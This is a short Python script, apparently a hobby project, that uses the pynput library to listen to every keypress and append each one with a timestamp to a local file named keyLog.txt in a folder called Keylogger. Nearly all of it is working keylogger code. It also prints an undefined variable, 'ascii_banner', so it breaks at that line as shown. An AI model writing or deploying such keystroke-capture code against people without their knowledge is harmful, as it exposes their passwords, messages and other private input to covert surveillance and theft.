import pynput
import pyfiglet
from pynput.keyboard import Key, Listener
import logging

print(ascii_banner)

log_dir = r"C:\Users\ACER\source\repos\Keylogger"
logging.basicConfig(filename = (log_dir + r"keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
   
with Listener(on_press=on_press) as listener:
    listener.join()

